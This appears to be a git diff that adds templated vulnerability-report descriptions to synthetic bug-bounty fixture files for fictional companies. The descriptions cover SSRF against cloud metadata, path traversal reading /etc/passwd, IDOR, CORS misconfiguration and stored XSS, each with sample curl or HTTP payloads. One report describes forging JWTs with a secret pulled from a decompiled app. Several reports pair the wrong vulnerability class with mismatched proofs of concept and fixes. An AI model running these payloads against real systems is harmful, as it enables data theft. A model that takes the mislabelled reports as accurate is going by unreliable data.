       "status": "accepted",
@@ -10725,7 +10806,8 @@
           "offset": "5d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10865,7 +10947,8 @@
           "offset": "3d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10979,7 +11062,8 @@
           "offset": "2d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11129,7 +11213,8 @@
           "offset": "7d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11244,7 +11329,8 @@
           "offset": "1d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11351,7 +11437,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11449,7 +11536,8 @@
           "offset": "6d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11599,7 +11687,8 @@
           "offset": "9d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.edelquarz-pharma.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11733,7 +11822,8 @@
           "offset": "7d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.edelquarz-pharma.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11843,7 +11933,8 @@
           "offset": "3d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11978,7 +12069,8 @@
           "offset": "10d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.edelquarz-pharma.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12121,7 +12213,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12257,7 +12350,8 @@
           "offset": "1d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/felsentor_watchworks_reports.json b/fixtures/reports/felsentor_watchworks_reports.json
index da34fac..8b11dee 100644
--- a/fixtures/reports/felsentor_watchworks_reports.json
+++ b/fixtures/reports/felsentor_watchworks_reports.json
@@ -56,7 +56,8 @@
           "offset": "1d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "Static analysis and reverse engineering of the Android shop application reveals that a symmetric JWT signing secret is embedded directly in the client code and used to sign dealer preview tokens. Because HS256 relies on a shared secret, possession of this key enables any attacker to forge valid tokens that the backend accepts as dealer-only credentials. This effectively bypasses access controls for protected preview features, pricing, and potentially early-release catalog entries. Embedding secrets in mobile binaries also facilitates broad redistribution and automated extraction, compounding the risk.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Shop Mobile 2.1.0\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Obtain the APK and compute its sha256 for reference; open with jadx/apktool to decompile classes.\n- Search for JWT-related utilities (e.g., JwtUtil.java) and identify a hardcoded SECRET constant used with HS256.\n- Create a JWT header/payload reflecting a dealer role or required claims (exp, aud) and sign with the extracted secret using any JWT library.\n- Send the forged token to GET /api/dealer/preview with Authorization: Bearer <token> and observe a 200 response with dealer-only data.\n- Optionally attempt privilege escalation to additional dealer endpoints to confirm the blast radius of the embedded secret.\n- Validate that token verification uses HS256 and does not perform additional device attestation or key binding.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -193,7 +194,8 @@
           "offset": "11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -308,7 +310,8 @@
           "offset": "3d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -419,7 +422,8 @@
           "offset": "4d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -535,7 +539,8 @@
           "offset": "8d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -695,7 +700,8 @@
           "offset": "6d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -871,7 +877,8 @@
           "offset": "7d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -998,7 +1005,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1134,7 +1142,8 @@
           "offset": "4d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1243,7 +1252,8 @@
           "offset": "4d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1391,7 +1401,8 @@
           "offset": "3d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1487,7 +1498,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1647,7 +1659,8 @@
           "offset": "8d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1762,7 +1775,8 @@
           "offset": "1d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1885,7 +1899,8 @@
           "offset": "2d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2017,7 +2032,8 @@
           "offset": "7d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2161,7 +2177,8 @@
           "offset": "3d 22h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
